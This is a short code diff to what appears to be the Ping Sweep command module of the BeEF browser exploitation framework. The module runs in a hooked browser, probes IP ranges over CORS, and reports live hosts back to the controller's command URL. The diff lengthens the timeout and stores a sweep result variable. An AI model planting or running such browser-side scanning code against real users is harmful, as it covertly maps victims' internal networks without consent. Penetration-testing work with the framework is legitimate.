@@ -9,7 +9,7 @@ beef.execute(function() {
   var ips = new Array();
   var rhosts = "<%= @rhosts %>";
   var threads = parseInt("<%= @threads %>", 10) || 3;
-  var timeout = 1000;
+  var timeout = 2000;
 
   if(!beef.browser.hasCors()) {
     beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=Browser does not support CORS', beef.are.status_error());
@@ -97,6 +97,7 @@ beef.execute(function() {
           'if (duration < '+timeout+') {' +
             'beef.debug("[Ping Sweep] '+ip+' [" + duration + " ms] -- host is up");' +
             'beef.net.send("<%= @command_url %>", <%= @command_id %>, "ip='+ip+'&ping="+duration+"ms", beef.are.status_success());' +
+            'ping_sweep_mod_output = [beef.are.status_success(), "'+ip+'"];' + 
           '} else {' +
             'beef.debug("[Ping Sweep] '+ip+' [" + duration + " ms] -- timeout");' +
           '}' +
